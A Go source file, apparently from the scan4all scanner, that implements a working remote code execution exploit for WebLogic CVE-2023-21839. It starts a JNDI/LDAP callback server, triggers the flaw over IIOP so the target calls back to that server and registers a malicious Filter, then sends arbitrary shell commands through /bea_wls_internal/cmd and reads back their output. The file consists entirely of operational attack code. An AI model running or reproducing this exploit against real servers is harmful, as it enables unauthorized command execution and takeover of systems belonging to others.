package scanner

import (
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/GhostTroops/scan4all/pkg/cvecore/rceverify"
	"github.com/GhostTroops/scan4all/pkg/cvecore/weblogic"
)

// freePort 让内核分配一个空闲 TCP 端口。
func freePort() (int, error) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return 0, err
	}
	defer ln.Close()
	return ln.Addr().(*net.TCPAddr).Port, nil
}

// callbackHost 解析目标容器/主机可回连到扫描器的地址。
//   - 显式配置 lhost 优先；
//   - 本地 Docker 目标（loopback）用 host.docker.internal（Docker Desktop 网关）；
//   - 远程目标用本机非 loopback IPv4。
func callbackHost(targetHost, lhost string) string {
	if lhost != "" {
		return lhost
	}
	if strings.HasPrefix(targetHost, "127.") {
		return "host.docker.internal"
	}
	return weblogic.LocalIPForJRMP(targetHost)
}

// exploitIIOP21839 在进程内启动 JNDI 回连服务，通过远程 IIOP/GIOP 触发
// CVE-2023-21839，再经动态注册的 Filter 回显命令。全程真实网络，无 mock。
func exploitIIOP21839(host string, port int, timeout time.Duration, cmd, lhost string) (string, error) {
	cb := callbackHost(host, lhost)

	ldapPort, err := freePort()
	if err != nil {
		return "", fmt.Errorf("alloc ldap port: %w", err)
	}
	httpPort, err := freePort()
	if err != nil {
		return "", fmt.Errorf("alloc http port: %w", err)
	}

	srv := rceverify.New(cb, httpPort, ldapPort)
	srv.LDAPPath = "ixpnv5"
	srv.JavaNative = true
	if err := srv.Start(); err != nil {
		return "", fmt.Errorf("start jndi server: %w", err)
	}
	defer srv.Stop()

	if err := weblogic.ExploitCVE2023_21839(host, port, timeout, srv.LDAPURL()); err != nil {
		return "", err
	}

	// 动态 Filter 注册在 /bea_wls_internal 上下文，命令经该路径回显。
	verifyURL := fmt.Sprintf("http://%s:%d/bea_wls_internal/cmd?c=%s",
		host, port, url.QueryEscape(cmd))
	return pollCmd(verifyURL, 15*time.Second)
}

// pollCmd 轮询命令入口，等待 Filter 就绪后返回真实回显。
func pollCmd(rawURL string, within time.Duration) (string, error) {
	deadline := time.Now().Add(within)
	var lastErr error
	for time.Now().Before(deadline) {
		resp, err := http.Get(rawURL)
		if err != nil {
			lastErr = err
			time.Sleep(500 * time.Millisecond)
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK && len(strings.TrimSpace(string(body))) > 0 {
			return strings.TrimSpace(string(body)), nil
		}
		lastErr = fmt.Errorf("http %d", resp.StatusCode)
		time.Sleep(500 * time.Millisecond)
	}
	if lastErr == nil {
		lastErr = fmt.Errorf("no output")
	}
	return "", fmt.Errorf("verify command failed: %v", lastErr)
}
